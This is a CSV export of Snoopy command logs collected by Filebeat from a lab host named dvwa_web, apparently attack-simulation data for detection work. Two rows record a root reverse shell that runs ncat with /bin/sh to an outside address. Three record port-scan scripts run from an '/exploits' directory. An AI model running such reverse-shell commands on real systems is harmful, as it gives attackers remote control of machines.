"@timestamp","_id","_index","_score","agent.ephemeral_id","agent.hostname","agent.id","agent.name","agent.type","agent.version",command,cwd,"ecs.version","event.dataset","event.ingested",filename,"host.architecture","host.containerized","host.hostname","host.id","host.ip","host.mac","host.name","host.os.codename","host.os.family","host.os.kernel","host.os.name","host.os.name.text","host.os.platform","host.os.type","host.os.version","input.type","log.file.path","log.offset",message,sid,tty,uid
"Oct 24, 2022 @ 23:28:04.968",gNqbCoQBDsc6tFfS01M9,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/sbin/exim4 -Mc 1omzMv-0014jQ-MK","/var/spool/exim4","8.0.0",snoopy,"Oct 24, 2022 @ 23:28:15.129","/usr/sbin/exim4","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","655,559","[uid:105 sid:256521 tty:(none) cwd:/var/spool/exim4 filename:/usr/sbin/exim4]: /usr/sbin/exim4 -Mc 1omzMv-0014jQ-MK",256521,"(none)",105
"Oct 24, 2022 @ 23:28:04.904",f9qbCoQBDsc6tFfS01M9,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","ncat -e /bin/sh 123.123.123.250 9002","/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:28:15.129","/usr/bin/ncat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","655,458","[uid:0 sid:256518 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002",256518,"(none)",0
"Oct 24, 2022 @ 23:27:58.765",ldqbCoQBDsc6tFfSwRJ3,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","python3 PortScan.py 10.10.10.30","/exploits/Discovery_T1046","8.0.0",snoopy,"Oct 24, 2022 @ 23:28:10.569","/usr/bin/python3","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","655,335","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Discovery_T1046 filename:/usr/bin/python3]: python3 PortScan.py 10.10.10.30",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:27:34.677",wNibCoQBDsc6tFfSQ2CD,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","python3 PortScan.py 10.10.10.20","/exploits/Discovery_T1046","8.0.0",snoopy,"Oct 24, 2022 @ 23:27:38.359","/usr/bin/python3","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","655,212","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Discovery_T1046 filename:/usr/bin/python3]: python3 PortScan.py 10.10.10.20",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:27:10.609",fteaCoQBDsc6tFfS2Bx6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","ncat -e /bin/sh 123.123.123.250 9002","/root","8.0.0",snoopy,"Oct 24, 2022 @ 23:27:10.934","/usr/bin/ncat","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","654,793","[uid:0 sid:256469 tty:(none) cwd:/root filename:/usr/bin/ncat]: ncat -e /bin/sh 123.123.123.250 9002",256469,"(none)",0
"Oct 24, 2022 @ 23:27:10.609",f9eaCoQBDsc6tFfS2Bx6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/sbin/exim4 -Mc 1omzLx-0014id-Ki","/var/spool/exim4","8.0.0",snoopy,"Oct 24, 2022 @ 23:27:10.934","/usr/sbin/exim4","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","654,894","[uid:105 sid:256472 tty:(none) cwd:/var/spool/exim4 filename:/usr/sbin/exim4]: /usr/sbin/exim4 -Mc 1omzLx-0014id-Ki",256472,"(none)",105
"Oct 24, 2022 @ 23:27:10.609",gNeaCoQBDsc6tFfS2Bx6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","python3 PortScan.py 10.10.10.10","/exploits/Discovery_T1046","8.0.0",snoopy,"Oct 24, 2022 @ 23:27:10.934","/usr/bin/python3","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","655,010","[uid:0 sid:256075 tty:/dev/pts/0 cwd:/exploits/Discovery_T1046 filename:/usr/bin/python3]: python3 PortScan.py 10.10.10.10",256075,"/dev/pts/0",0
"Oct 24, 2022 @ 23:27:10.609",gdeaCoQBDsc6tFfS2Bx6,".ds-filebeat-8.4.3-2022.10.24-000001","-","71df9d48-1d5b-48bc-9d0b-4c069d92c8ca","dvwa_web","8d42cf34-4f58-4413-b965-cf6afa6eb26b","dvwa_web",filebeat,"8.4.3","/usr/sbin/sshd -R","/","8.0.0",snoopy,"Oct 24, 2022 @ 23:27:10.934","/usr/sbin/sshd","x86_64",false,"dvwa_web",bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b","dvwa_web",bullseye,debian,"5.15.0-52-generic","Debian GNU/Linux","Debian GNU/Linux",debian,linux,"11 (bullseye)",filestream,"/var/log/snoopy.log","655,133","[uid:0 sid:256478 tty:(none) cwd:/ filename:/usr/sbin/sshd]: /usr/sbin/sshd -R",256478,"(none)",0
